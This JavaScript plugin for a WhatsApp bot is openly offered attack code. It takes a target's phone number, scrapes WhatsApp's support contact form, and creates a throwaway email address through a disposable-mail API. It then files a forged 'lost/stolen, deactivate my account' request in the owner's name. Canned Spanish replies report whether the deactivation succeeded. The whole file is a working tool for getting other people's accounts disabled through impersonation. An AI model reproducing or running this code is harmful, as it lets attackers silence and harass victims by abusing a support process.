import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '[❗] 𝙸𝙽𝙶𝚁𝙴𝚂𝙴 𝙴𝙻 𝙽𝚄𝙼𝙴𝚁𝙾 𝚀𝚄𝙴 𝙳𝙴𝚂𝙴𝙴 𝙳𝙴𝚂𝙰𝙲𝚃𝙸𝚅𝙰𝚁 𝙴𝙽 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙲𝙸𝙾𝙽𝙰𝙻, 𝙴𝙹𝙴𝙼𝙿𝙻𝙾: +𝟷 (𝟺𝟻0) 555-555'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 -##\n\n𝙷𝙾𝙻𝙰 👋,\n\n𝙶𝚁𝙰𝙲𝙸𝙰𝚂 𝙿𝙾𝚁 𝚃𝚄 𝙼𝙴𝙽𝚂𝙰𝙹𝙴.\n\n𝙷𝙴𝙼𝙾𝚂 𝙳𝙴𝚂𝙰𝙲𝚃𝙸𝚅𝙰𝙳𝙾 𝚃𝚄 𝙲𝚄𝙴𝙽𝚃𝙰 𝙳𝙴 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿. 𝙴𝚂𝚃𝙾 𝚂𝙸𝙶𝙽𝙸𝙵𝙸𝙲𝙰 𝚀𝚄𝙴 𝚂𝚄 𝙲𝚄𝙴𝙽𝚃𝙰 𝙴𝚂𝚃𝙰́ 𝙳𝙴𝚂𝙷𝙰𝙱𝙸𝙻𝙸𝚃𝙰𝙳𝙰 𝚃𝙴𝙼𝙿𝙾𝚁𝙰𝙻𝙼𝙴𝙽𝚃𝙴 𝚈 𝚂𝙴 𝙴𝙻𝙸𝙼𝙸𝙽𝙰𝚁𝙰́ 𝙰𝚄𝚃𝙾𝙼𝙰́𝚃𝙸𝙲𝙰𝙼𝙴𝙽𝚃𝙴 𝙴𝙽 𝟹0 𝙳𝙸́𝙰𝚂 𝚂𝙸 𝙽𝙾 𝚅𝚄𝙴𝙻𝚅𝙴 𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝚁 𝙻𝙰 𝙲𝚄𝙴𝙽𝚃𝙰. 𝚃𝙴𝙽𝙶𝙰 𝙴𝙽 𝙲𝚄𝙴𝙽𝚃𝙰: 𝙴𝙻 𝙴𝚀𝚄𝙸𝙿𝙾 𝙳𝙴 𝙰𝚃𝙴𝙽𝙲𝙸𝙾́𝙽 𝙰𝙻 𝙲𝙻𝙸𝙴𝙽𝚃𝙴 𝙳𝙴 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙽𝙾 𝙿𝚄𝙴𝙳𝙴 𝙴𝙻𝙸𝙼𝙸𝙽𝙰𝚁 𝚂𝚄 𝙲𝚄𝙴𝙽𝚃𝙰 𝙼𝙰𝙽𝚄𝙰𝙻𝙼𝙴𝙽𝚃𝙴.\n\n𝙳𝚄𝚁𝙰𝙽𝚃𝙴 𝙴𝙻 𝙿𝙴𝚁𝙸́𝙾𝙳𝙾 𝙳𝙴 𝙲𝙸𝙴𝚁𝚁𝙴:\n • 𝙴𝚂 𝙿𝙾𝚂𝙸𝙱𝙻𝙴 𝚀𝚄𝙴 𝚂𝚄𝚂 𝙲𝙾𝙽𝚃𝙰𝙲𝚃𝙾𝚂 𝙴𝙽 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙰𝚄́𝙽 𝚅𝙴𝙰𝙽 𝚂𝚄 𝙽𝙾𝙼𝙱𝚁𝙴 𝚈 𝙵𝙾𝚃𝙾 𝙳𝙴 𝙿𝙴𝚁𝙵𝙸𝙻.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\n𝚂𝙸 𝙳𝙴𝚂𝙴𝙰 𝚁𝙴𝙲𝚄𝙿𝙴𝚁𝙰𝚁 𝚂𝚄 𝙲𝚄𝙴𝙽𝚃𝙰, 𝚅𝚄𝙴𝙻𝚅𝙰 𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝚁 𝚂𝚄 𝙲𝚄𝙴𝙽𝚃𝙰 𝙻𝙾 𝙰𝙽𝚃𝙴𝚂 𝙿𝙾𝚂𝙸𝙱𝙻𝙴.\n𝚅𝚄𝙴𝙻𝚅𝙰 𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝚁 𝚂𝚄 𝙲𝚄𝙴𝙽𝚃𝙰 𝙸𝙽𝙶𝚁𝙴𝚂𝙰𝙽𝙳𝙾 𝙴𝙻 𝙲𝙾́𝙳𝙸𝙶𝙾 𝙳𝙴 𝟼 𝙳𝙸́𝙶𝙸𝚃𝙾𝚂, 𝙴𝙻 𝙲𝙾́𝙳𝙸𝙶𝙾 𝚀𝚄𝙴 𝚁𝙴𝙲𝙸𝙱𝙴 𝙿𝙾𝚁 𝚂𝙼𝚂 𝙾 𝙻𝙻𝙰𝙼𝙰𝙳𝙰 𝚃𝙴𝙻𝙴𝙵𝙾́𝙽𝙸𝙲𝙰. 𝚂𝙸 𝚃𝙴 𝚅𝚄𝙴𝙻𝚅𝙴𝚂 𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝚁\n\n𝚂𝙸 𝚃𝙸𝙴𝙽𝙴 𝙰𝙻𝙶𝚄𝙽𝙰 𝙾𝚃𝚁𝙰 𝙿𝚁𝙴𝙶𝚄𝙽𝚃𝙰 𝙾 𝙸𝙽𝚀𝚄𝙸𝙴𝚃𝚄𝙳, 𝙽𝙾 𝙳𝚄𝙳𝙴 𝙴𝙽 𝙿𝙾𝙽𝙴𝚁𝚂𝙴 𝙴𝙽 𝙲𝙾𝙽𝚃𝙰𝙲𝚃𝙾 𝙲𝙾𝙽 𝙽𝙾𝚂𝙾𝚃𝚁𝙾𝚂. 𝙴𝚂𝚃𝙰𝚁𝙴𝙼𝙾𝚂 𝙴𝙽𝙲𝙰𝙽𝚃𝙰𝙳𝙾𝚂 𝙳𝙴 𝙰𝚈𝚄𝙳𝙰𝚁!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 -##\n\n𝙷𝙾𝙻𝙰 👋:\n\n𝙶𝚁𝙰𝙲𝙸𝙰𝚂 𝙿𝙾𝚁 𝚃𝚄 𝙼𝙴𝙽𝚂𝙰𝙹𝙴.\n\n𝙿𝙰𝚁𝙰 𝙿𝚁𝙾𝙲𝙴𝙳𝙴𝚁 𝙲𝙾𝙽 𝚃𝚄 𝚂𝙾𝙻𝙸𝙲𝙸𝚃𝚄𝙳, 𝙽𝙴𝙲𝙴𝚂𝙸𝚃𝙰𝙼𝙾𝚂 𝚀𝚄𝙴 𝚅𝙴𝚁𝙸𝙵𝙸𝚀𝚄𝙴𝚂 𝚀𝚄𝙴 𝙴𝚂𝚃𝙴 𝙽𝚄́𝙼𝙴𝚁𝙾 𝙳𝙴 𝚃𝙴𝙻𝙴́𝙵𝙾𝙽𝙾 𝚃𝙴 𝙿𝙴𝚁𝚃𝙴𝙽𝙴𝙲𝙴. 𝙿𝙾𝚁 𝙵𝙰𝚅𝙾𝚁, 𝙴𝙽𝚅𝙸́𝙰𝙽𝙾𝚂 𝙳𝙾𝙲𝚄𝙼𝙴𝙽𝚃𝙰𝙲𝙸𝙾́𝙽 𝚀𝚄𝙴 𝙽𝙾𝚂 𝙿𝙴𝚁𝙼𝙸𝚃𝙰 𝚅𝙴𝚁𝙸𝙵𝙸𝙲𝙰𝚁 𝚀𝚄𝙴 𝙴𝙻 𝙽𝚄́𝙼𝙴𝚁𝙾 𝙴𝚂 𝙳𝙴 𝚃𝚄 𝙿𝚁𝙾𝙿𝙸𝙴𝙳𝙰𝙳, 𝙲𝙾𝙼𝙾 𝚄𝙽𝙰 𝙲𝙾𝙿𝙸𝙰 𝙳𝙴 𝙻𝙰 𝙵𝙰𝙲𝚃𝚄𝚁𝙰 𝚃𝙴𝙻𝙴𝙵𝙾́𝙽𝙸𝙲𝙰 𝙾 𝙴𝙻 𝙲𝙾𝙽𝚃𝚁𝙰𝚃𝙾 𝙳𝙴 𝚂𝙴𝚁𝚅𝙸𝙲𝙸𝙾.\n\n𝙿𝙾𝚁 𝙵𝙰𝚅𝙾𝚁, 𝙰𝚂𝙴𝙶𝚄́𝚁𝙰𝚃𝙴 𝙳𝙴 𝙸𝙽𝙶𝚁𝙴𝚂𝙰𝚁 𝚃𝚄 𝙽𝚄́𝙼𝙴𝚁𝙾 𝙳𝙴 𝚃𝙴𝙻𝙴́𝙵𝙾𝙽𝙾 𝙴𝙽 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙲𝙸𝙾𝙽𝙰𝙻 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙾. 𝙿𝙰𝚁𝙰 𝙾𝙱𝚃𝙴𝙽𝙴𝚁 𝙼𝙰́𝚂 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝙲𝙸𝙾́𝙽 𝚂𝙾𝙱𝚁𝙴 𝙴𝙻 𝙵𝙾𝚁𝙼𝙰𝚃𝙾 𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙲𝙸𝙾𝙽𝙰𝙻, 𝙲𝙾𝙽𝚂𝚄𝙻𝚃𝙰 𝙴𝚂𝚃𝙴 𝙰𝚁𝚃𝙸́𝙲𝚄𝙻𝙾.\n\n𝚂𝙸 𝚃𝙸𝙴𝙽𝙴𝚂 𝙰𝙻𝙶𝚄𝙽𝙰 𝙾𝚃𝚁𝙰 𝙿𝚁𝙴𝙶𝚄𝙽𝚃𝙰 𝙾 𝙸𝙽𝚀𝚄𝙸𝙴𝚃𝚄𝙳, 𝙽𝙾 𝙳𝚄𝙳𝙴𝚂 𝙴𝙽 𝙲𝙾𝙽𝚃𝙰𝙲𝚃𝙰𝚁𝙽𝙾𝚂. 𝙴𝚂𝚃𝙰𝚁𝙴𝙼𝙾𝚂 𝙴𝙽𝙲𝙰𝙽𝚃𝙰𝙳𝙾𝚂 𝙳𝙴 𝙰𝚈𝚄𝙳𝙰𝚁𝚃𝙴.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true 
export default handler